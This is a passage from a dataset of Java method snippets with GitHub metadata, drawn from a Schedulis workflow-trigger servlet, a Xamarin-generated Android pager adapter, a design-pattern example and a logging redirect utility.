32381, "method_name": "handleAJAXAction", "class_name": "FlowTriggerInstanceServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleAJAXAction(final HttpServletRequest req,\n      final HttpServletResponse resp, final Session session) throws ServletException,\n      IOException {\n    final HashMap<String, Object> ret = new HashMap<>();\n    final String ajaxName = getParam(req, \"ajax\");\n\n    //todo chengren311: add permission control\n    if (ajaxName.equals(\"fetchRunningTriggers\")) {\n      ajaxFetchRunningTriggerInstances(ret);\n    } else if (ajaxName.equals(\"killRunningTrigger\")) {\n      if (hasParam(req, \"id\")) {\n        final String triggerInstanceId = getParam(req, \"id\");\n        ajaxKillTriggerInstance(triggerInstanceId, session, ret);\n      } else {\n        ret.put(\"error\", \"please specify a valid running trigger instance id\");\n      }\n    } else if (ajaxName.equals(\"showTriggerProperties\")) {\n      if (hasParam(req, \"id\")) {\n        final String triggerInstanceId = getParam(req, \"id\");\n        loadTriggerProperties(triggerInstanceId, ret);\n      } else {\n        ret.put(\"error\", \"please specify a valid running trigger instance id\");\n      }\n    } else if (ajaxName.equals(\"fetchTriggerStatus\")) {\n      if (hasParam(req, \"triggerinstid\")) {\n        final String triggerInstanceId = getParam(req, \"triggerinstid\");\n        ajaxFetchTriggerInstanceByTriggerInstId(triggerInstanceId, session, ret);\n      } else if (hasParam(req, \"execid\")) {\n        final int execId = getIntParam(req, \"execid\");\n        ajaxFetchTriggerInstanceByExecId(execId, session, ret);\n      } else {\n        ret.put(\"error\", \"please specify a valid trigger instance id or flow execution id\");\n      }\n    } else if (ajaxName.equals(\"fetchTriggerInstances\")) {\n      if (hasParam(req, \"project\") && hasParam(req, \"flow\")) {\n        final String projectName = getParam(req, \"project\");\n        final String flowId = getParam(req, \"flow\");\n        final Project project = this.projectManager.getProject(projectName);\n        if (project == null) {\n          ret.put(\"error\", \"please specify a valid project name\");\n        } else if (!hasPermission(project, session.getUser(), Type.READ)) {\n          ret.put(\"error\", \"Permission denied. Need READ access.\");\n        } else {\n          ajaxFetchTriggerInstances(project.getId(), flowId, ret, req);\n        }\n      } else {\n        ret.put(\"error\", \"please specify project id and flow id\");\n      }\n    }\n\n    if (ret != null) {\n      this.writeJSON(resp, ret);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32382, "method_name": "ajaxFetchTriggerInstances", "class_name": "FlowTriggerInstanceServlet", "params": ["int", "String", "HashMap<String,Object>", "HttpServletRequest"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxFetchTriggerInstances(\n      final int projectId,\n      final String flowId,\n      final HashMap<String, Object> ret,\n      final HttpServletRequest req)\n      throws ServletException {\n\n    final int from = Integer.valueOf(getParam(req, \"start\"));\n    final int length = Integer.valueOf(getParam(req, \"length\"));\n\n    final Collection<TriggerInstance> triggerInstances = this.triggerService\n        .getTriggerInstances(projectId, flowId, from, length);\n\n    ret.put(\"flow\", flowId);\n    ret.put(\"total\", triggerInstances.size());\n    ret.put(\"from\", from);\n    ret.put(\"length\", length);\n\n    final List<Object> history = new ArrayList<>();\n    for (final TriggerInstance instance : triggerInstances) {\n      final HashMap<String, Object> triggerInfo = new HashMap<>();\n      triggerInfo.put(\"instanceId\", instance.getId());\n      triggerInfo.put(\"submitUser\", instance.getSubmitUser());\n      triggerInfo.put(\"startTime\", instance.getStartTime());\n      triggerInfo.put(\"endTime\", instance.getEndTime());\n      triggerInfo.put(\"status\", instance.getStatus().toString());\n      history.add(triggerInfo);\n    }\n\n    ret.put(\"executions\", history);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32383, "method_name": "loadTriggerProperties", "class_name": "FlowTriggerInstanceServlet", "params": ["String", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadTriggerProperties(final String triggerInstanceId,\n      final HashMap<String, Object> ret) {\n    final TriggerInstance triggerInstance = this.triggerService\n        .findTriggerInstanceById(triggerInstanceId);\n    if (triggerInstance != null) {\n      ret.put(\"triggerProperties\", triggerInstance.getFlowTrigger().toString());\n    } else {\n      ret.put(\"error\", \"the trigger instance doesn't exist\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32384, "method_name": "wrapTriggerInst", "class_name": "FlowTriggerInstanceServlet", "params": ["TriggerInstance", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void wrapTriggerInst(final TriggerInstance triggerInst,\n      final HashMap<String, Object> ret) {\n    final List<Map<String, Object>> dependencyOutput = new ArrayList<>();\n    for (final DependencyInstance depInst : triggerInst.getDepInstances()) {\n      final Map<String, Object> depMap = new HashMap<>();\n      depMap.put(\"triggerInstanceId\", depInst.getTriggerInstance().getId());\n      depMap.put(\"dependencyName\", depInst.getDepName());\n      depMap.put(\"dependencyType\", depInst.getTriggerInstance().getFlowTrigger()\n          .getDependencyByName(depInst.getDepName()).getType());\n      depMap.put(\"dependencyStartTime\", depInst.getStartTime());\n      depMap.put(\"dependencyEndTime\", depInst.getEndTime());\n      depMap.put(\"dependencyStatus\", depInst.getStatus());\n      depMap.put(\"dependencyCancelCause\", depInst.getCancellationCause());\n      depMap.put(\"dependencyConfig\", depInst.getTriggerInstance().getFlowTrigger()\n          .getDependencyByName(depInst.getDepName()));\n      dependencyOutput.add(depMap);\n    }\n    ret.put(\"items\", dependencyOutput);\n\n    ret.put(\"triggerId\", triggerInst.getId());\n    ret.put(\"triggerSubmitter\", triggerInst.getSubmitUser());\n    ret.put(\"triggerStartTime\", triggerInst.getStartTime());\n    ret.put(\"triggerEndTime\", triggerInst.getEndTime());\n    ret.put(\"triggerStatus\", triggerInst.getStatus());\n    final String flowTriggerJson = new GsonBuilder().setPrettyPrinting().create()\n        .toJson(triggerInst.getFlowTrigger());\n    ret.put(\"triggerProps\", flowTriggerJson);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32385, "method_name": "ajaxFetchTriggerInstanceByExecId", "class_name": "FlowTriggerInstanceServlet", "params": ["int", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxFetchTriggerInstanceByExecId(final int execId, final Session session,\n      final HashMap<String, Object> ret) {\n    final TriggerInstance triggerInst = this.triggerService\n        .findTriggerInstanceByExecId(execId);\n    if (triggerInst != null) {\n      wrapTriggerInst(triggerInst, ret);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32386, "method_name": "ajaxFetchTriggerInstanceByTriggerInstId", "class_name": "FlowTriggerInstanceServlet", "params": ["String", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxFetchTriggerInstanceByTriggerInstId(final String triggerInstanceId,\n      final Session session, final HashMap<String, Object> ret) {\n    final TriggerInstance triggerInst = this.triggerService\n        .findTriggerInstanceById(triggerInstanceId);\n    if (triggerInst != null) {\n      wrapTriggerInst(triggerInst, ret);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32387, "method_name": "ajaxKillTriggerInstance", "class_name": "FlowTriggerInstanceServlet", "params": ["String", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxKillTriggerInstance(final String triggerInstanceId, final Session session,\n      final HashMap<String, Object> ret) {\n    final TriggerInstance triggerInst = this.triggerService\n        .findRunningTriggerInstById(triggerInstanceId);\n    if (triggerInst != null) {\n      if (hasPermission(triggerInst.getProject(), session.getUser(), Type.EXECUTE)) {\n        this.triggerService.cancelTriggerInstance(triggerInst, CancellationCause.MANUAL);\n      } else {\n        ret.put(\"error\", \"no permission to kill the trigger\");\n      }\n    } else {\n      ret.put(\"error\", \"the trigger doesn't exist, might already finished or cancelled\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32388, "method_name": "ajaxFetchRunningTriggerInstances", "class_name": "FlowTriggerInstanceServlet", "params": ["HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void ajaxFetchRunningTriggerInstances(final HashMap<String, Object> ret) throws\n      ServletException {\n    final Collection<TriggerInstance> triggerInstanceList = this.triggerService\n        .getRunningTriggers();\n\n    final List<HashMap<String, Object>> output = new ArrayList<>();\n    ret.put(\"items\", output);\n\n    for (final TriggerInstance triggerInstance : triggerInstanceList) {\n      writeTriggerInstancesData(output, triggerInstance);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32389, "method_name": "writeTriggerInstancesData", "class_name": "FlowTriggerInstanceServlet", "params": ["List<HashMap>", "TriggerInstance"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void writeTriggerInstancesData(final List<HashMap<String, Object>> output,\n      final TriggerInstance triggerInst) {\n\n    final HashMap<String, Object> data = new HashMap<>();\n    data.put(\"id\", triggerInst.getId());\n    data.put(\"starttime\", triggerInst.getStartTime());\n    data.put(\"endtime\", triggerInst.getEndTime());\n    data.put(\"status\", triggerInst.getStatus());\n    data.put(\"flowExecutionId\", triggerInst.getFlowExecId());\n    data.put(\"submitUser\", triggerInst.getSubmitUser());\n    data.put(\"flowTriggerConfig\", triggerInst.getFlowTrigger());\n    final List<Map<String, Object>> dependencyOutput = new ArrayList<>();\n    for (final DependencyInstance depInst : triggerInst.getDepInstances()) {\n      final Map<String, Object> depMap = new HashMap<>();\n      depMap.put(\"dependencyName\", depInst.getDepName());\n      depMap.put(\"dependencyStarttime\", depInst.getStartTime());\n      depMap.put(\"dependencyEndtime\", depInst.getEndTime());\n      depMap.put(\"dependencyStatus\", depInst.getStatus());\n      depMap.put(\"dependencyConfig\", depInst.getTriggerInstance().getFlowTrigger()\n          .getDependencyByName\n              (depInst.getDepName()));\n      dependencyOutput.add(depMap);\n    }\n    data.put(\"dependencies\", dependencyOutput);\n    output.add(data);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32390, "method_name": "handlePost", "class_name": "FlowTriggerInstanceServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,\n      final Session session) throws ServletException, IOException {\n    if (hasParam(req, \"ajax\")) {\n      handleAJAXAction(req, resp, session);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32391, "method_name": "parseTimeZone", "class_name": "FlowTriggerInstanceServlet", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "DateTimeZone", "snippet": "  private DateTimeZone parseTimeZone(final String cronTimezone) {\n    if (cronTimezone != null && cronTimezone.equals(\"UTC\")) {\n      return DateTimeZone.UTC;\n    }\n\n    return DateTimeZone.getDefault();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32392, "method_name": "getPresentTimeByTimezone", "class_name": "FlowTriggerInstanceServlet", "params": ["DateTimeZone"], "throws": null, "modifiers": ["private"], "return_type": "DateTime", "snippet": "  private DateTime getPresentTimeByTimezone(final DateTimeZone timezone) {\n    return new DateTime(timezone);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 32393, "method_name": "getProjectName", "class_name": "ExecutorVMHelper", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getProjectName(final int id) {\n      final Project project = FlowTriggerInstanceServlet.this.projectManager.getProject(id);\n      if (project == null) {\n        return String.valueOf(id);\n      }\n\n      return project.getName();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/FlowTriggerInstanceServlet.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32394, "method_name": "getCount", "class_name": "FormsFragmentPagerAdapter_1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getCount ()\n\t{\n\t\treturn n_getCount ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32395, "method_name": "n_getCount", "class_name": "FormsFragmentPagerAdapter_1", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "int", "snippet": "\tprivate native int n_getCount ();\n\n\n\tpublic android.support.v4.app.Fragment getItem (int p0)\n\t{\n\t\treturn n_getItem (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32396, "method_name": "getItem", "class_name": "FormsFragmentPagerAdapter_1", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "android", "snippet": "\tpublic android.support.v4.app.Fragment getItem (int p0)\n\t{\n\t\treturn n_getItem (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32397, "method_name": "n_getItem", "class_name": "FormsFragmentPagerAdapter_1", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "android", "snippet": "\tprivate native android.support.v4.app.Fragment n_getItem (int p0);\n\n\n\tpublic long getItemId (int p0)\n\t{\n\t\treturn n_getItemId (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32398, "method_name": "getItemId", "class_name": "FormsFragmentPagerAdapter_1", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\tpublic long getItemId (int p0)\n\t{\n\t\treturn n_getItemId (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32399, "method_name": "n_getItemId", "class_name": "FormsFragmentPagerAdapter_1", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "long", "snippet": "\tprivate native long n_getItemId (int p0);\n\n\n\tpublic int getItemPosition (java.lang.Object p0)\n\t{\n\t\treturn n_getItemPosition (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32400, "method_name": "getItemPosition", "class_name": "FormsFragmentPagerAdapter_1", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getItemPosition (java.lang.Object p0)\n\t{\n\t\treturn n_getItemPosition (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32401, "method_name": "n_getItemPosition", "class_name": "FormsFragmentPagerAdapter_1", "params": ["java"], "throws": null, "modifiers": ["private", "native"], "return_type": "int", "snippet": "\tprivate native int n_getItemPosition (java.lang.Object p0);\n\n\n\tpublic java.lang.CharSequence getPageTitle (int p0)\n\t{\n\t\treturn n_getPageTitle (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32402, "method_name": "getPageTitle", "class_name": "FormsFragmentPagerAdapter_1", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "java", "snippet": "\tpublic java.lang.CharSequence getPageTitle (int p0)\n\t{\n\t\treturn n_getPageTitle (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32403, "method_name": "n_getPageTitle", "class_name": "FormsFragmentPagerAdapter_1", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "java", "snippet": "\tprivate native java.lang.CharSequence n_getPageTitle (int p0);\n\n\n\tpublic void restoreState (android.os.Parcelable p0, java.lang.ClassLoader p1)\n\t{\n\t\tn_restoreState (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32404, "method_name": "restoreState", "class_name": "FormsFragmentPagerAdapter_1", "params": ["android", "java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void restoreState (android.os.Parcelable p0, java.lang.ClassLoader p1)\n\t{\n\t\tn_restoreState (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32405, "method_name": "n_restoreState", "class_name": "FormsFragmentPagerAdapter_1", "params": ["android", "java"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_restoreState (android.os.Parcelable p0, java.lang.ClassLoader p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32406, "method_name": "monodroidAddReference", "class_name": "FormsFragmentPagerAdapter_1", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32407, "method_name": "monodroidClearReferences", "class_name": "FormsFragmentPagerAdapter_1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc64720bb2db43a66fe9/FormsFragmentPagerAdapter_1.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32408, "method_name": "showAccount", "class_name": "Bank", "params": [], "throws": null, "modifiers": ["abstract"], "return_type": "Account", "snippet": "    abstract Account showAccount();\n}\n\n", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/bridge/Bank.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 32409, "method_name": "getSignalKeyByJob", "class_name": "AzkabanJobSignalKeyCreator", "params": ["Job"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSignalKeyByJob(Job job) {\n        String projectId = job.getJobProps().get(LinkisJobTypeConf.PROJECT_ID);\n        String flowId = job.getJobProps().get(LinkisJobTypeConf.FLOW_NAME);\n        String flowExecId = job.getJobProps().get(LinkisJobTypeConf.FLOW_EXEC_ID);\n        return projectId + \".\" + flowId + \".\" + flowExecId ;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/linkis/job/AzkabanJobSignalKeyCreator.java", "stars": "18", "class_props": {"extends": null, "implements": ["JobSignalKeyCreator"], "modifiers": ["public"]}}, {"id": 32410, "method_name": "getSignalKeyBySignalSharedJob", "class_name": "AzkabanJobSignalKeyCreator", "params": ["SignalSharedJob"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSignalKeyBySignalSharedJob(SignalSharedJob job) {\n        return getSignalKeyByJob((Job)job);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/linkis/job/AzkabanJobSignalKeyCreator.java", "stars": "18", "class_props": {"extends": null, "implements": ["JobSignalKeyCreator"], "modifiers": ["public"]}}, {"id": 32411, "method_name": "openAccount", "class_name": "DepositAccount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Account", "snippet": "    public Account openAccount() {\n        System.out.println(\"\u6253\u5f00\u4e00\u4e2a\u5b9a\u671f\u5b58\u6b3e\u7684\u8d26\u6237\");\n        return new DepositAccount();\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/bridge/DepositAccount.java", "stars": "2", "class_props": {"extends": null, "implements": ["Account"], "modifiers": ["public"]}}, {"id": 32412, "method_name": "showAccountType", "class_name": "DepositAccount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showAccountType() {\n        System.out.println(\"\u8fd9\u662f\u4e00\u4e2a\u5b9a\u671f\u8d26\u53f7\");\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/bridge/DepositAccount.java", "stars": "2", "class_props": {"extends": null, "implements": ["Account"], "modifiers": ["public"]}}, {"id": 32413, "method_name": "redirectOutAndErrToLog", "class_name": "StdOutErrRedirect", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void redirectOutAndErrToLog() {\n    System.setOut(infoStream);\n    System.setErr(errorStream);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32414, "method_name": "createStream", "class_name": "StdOutErrRedirect", "params": ["PrintStream", "Level"], "throws": null, "modifiers": ["private", "static"], "return_type": "PrintStream", "snippet": "  private static PrintStream createStream(final PrintStream stream, final Level level) {\n    return new LogStream(stream, level);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32415, "method_name": "write", "class_name": "LogStream", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void write(final String string) {\n      logger.log(this.level, string);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32416, "method_name": "println", "class_name": "LogStream", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final String string) {\n      print(string);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32417, "method_name": "print", "class_name": "LogStream", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final String string) {\n      write(string);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32418, "method_name": "println", "class_name": "LogStream", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final boolean bool) {\n      print(bool);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32419, "method_name": "print", "class_name": "LogStream", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final boolean bool) {\n      write(String.valueOf(bool));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32420, "method_name": "println", "class_name": "LogStream", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final int i) {\n      print(i);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32421, "method_name": "print", "class_name": "LogStream", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void print(final int i) {\n      write(String.valueOf(i));\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32422, "method_name": "println", "class_name": "LogStream", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void println(final float f) {\n      print(f);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/StdOutErrRedirect.java", "stars": "18", "class_props": {"extends": "PrintStream", "implements": null, "modifiers": ["private", "static"]}}, {"id": 32423, "method_name": "print", "class_name": "LogStream", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void 